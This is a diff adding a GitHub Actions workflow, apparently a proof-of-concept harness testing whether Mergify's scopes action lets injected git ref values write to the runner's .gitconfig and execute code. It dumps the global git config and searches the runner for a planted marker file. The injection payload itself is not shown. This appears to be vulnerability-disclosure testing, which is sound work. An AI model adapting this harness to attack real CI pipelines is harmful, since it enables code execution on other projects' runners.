@@ -1,0 +1,63 @@
+name: zz-mergify-scopes-rce-poc
+on:
+  pull_request:
+jobs:
+  detect-scopes:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          fetch-depth: 0
+      - name: Baseline
+        run: |
+          echo "HOME=$HOME"
+          echo "--- .gitconfig before ---"
+          cat "$HOME/.gitconfig" 2>/dev/null || echo "(none)"
+          rm -f "$HOME/PWNED_RCE_MARKER" PWNED_RCE_MARKER
+
+      # ---- Mergify documented step 1
+      - name: Get git refs
+        id: refs
+        uses: Mergifyio/gha-mergify-ci@v25
+        with:
+          action: scopes-git-refs
+
+      - name: Show Mergify step outputs
+        run: |
+          echo "base=[${{ steps.refs.outputs.base }}]"
+          echo "head=[${{ steps.refs.outputs.head }}]"
+
+      # ---- Mergify documented step 2 (the consumer, copied from their docs)
+      - name: Get scopes
+        env:
+          BASE: ${{ steps.refs.outputs.base }}
+          HEAD: ${{ steps.refs.outputs.head }}
+        run: |
+          changed=$(git diff --name-only --diff-filter=ACMR "$BASE" "$HEAD" | tr '\n' ' ')
+          echo "changed=[$changed]"
+
+      - name: What landed in HOME/.gitconfig
+        run: |
+          echo "--- .gitconfig after ---"
+          cat "$HOME/.gitconfig" 2>/dev/null || echo "(none)"
+          echo "--- git's parse ---"
+          git config --global --list 2>&1 || true
+
+      # ---- Mergify documented step 3 - THEIR action, running after the write
+      - name: Scopes upload (Mergify's own action)
+        continue-on-error: true
+        uses: Mergifyio/gha-mergify-ci@v25
+        with:
+          action: scopes-upload
+          scopes: core
+
+      - name: Did anything execute?
+        if: always()
+        run: |
+          echo "--- searching for the marker ---"
+          find / -name 'PWNED_RCE_MARKER' -maxdepth 6 2>/dev/null | head -5
+          if find / -name 'PWNED_RCE_MARKER' -maxdepth 6 2>/dev/null | grep -q .; then
+            echo "RESULT: *** CODE EXECUTION IN THE RUNNER ***"
+          else
+            echo "RESULT: config written but no execution observed in this workflow"
+          fi
